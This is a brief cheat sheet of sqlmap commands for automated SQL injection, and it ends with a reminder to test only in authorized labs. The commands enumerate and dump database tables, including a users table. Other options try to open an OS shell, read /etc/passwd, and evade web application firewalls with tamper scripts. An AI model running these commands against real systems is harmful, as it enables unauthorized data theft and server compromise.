# SQLMap Cheat Sheet - SQL Injection Automation

### Core Commands
| Command | Description |
|---------|-----------|
| `sqlmap -u "http://target.com?id=1"` | Basic scan |
| `sqlmap -u URL --batch` | Non-interactive mode |
| `sqlmap -u URL --dbs` | List all databases |
| `sqlmap -u URL -D dbname --tables` | List tables |
| `sqlmap -u URL -D dbname -T users --dump` | Dump table data |

### Advanced Options
- `--dbms=mysql` → Specify database
- `--level=3 --risk=3` → More thorough testing
- `--os-shell` → Attempt to get OS shell
- `--file-read=/etc/passwd` → Read files
- `-o` → Optimized performance

**Pro Tips**:
- Start with low level/risk and increase gradually
- Use `--tamper` scripts to bypass WAFs
- Always test in authorized lab environments only
